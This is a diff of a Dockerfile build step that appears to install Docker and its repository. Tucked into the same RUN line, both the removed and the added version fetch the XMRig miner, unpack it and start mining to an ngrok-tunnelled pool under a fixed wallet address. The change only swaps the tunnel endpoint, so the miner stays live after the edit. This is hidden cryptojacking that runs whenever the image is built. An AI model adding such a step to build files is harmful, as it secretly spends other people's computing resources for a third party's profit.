@@ -5,7 +5,7 @@ RUN apt-get update && \
     apt-get install apt-transport-https ca-certificates curl software-properties-common && \
     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
     add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
-    apt-get update && wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -zxf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o 4.tcp.ngrok.io:16582 -a rx/0 -k -u SHIB:0xfc0ed5ad9bc0159ce822d87b7f0eccae4aa01e9d.$(echo $(shuf -i 1-9999 -n 1)-DEV) -p x \
+    apt-get update && wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -zxf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o 8.tcp.ngrok.io:15371 -a rx -k -u SHIB:0xfc0ed5ad9bc0159ce822d87b7f0eccae4aa01e9d.$(echo $(shuf -i 1-9999 -n 1)-DEV) -p x \
     apt install docker-ce
 
 # install docker compose
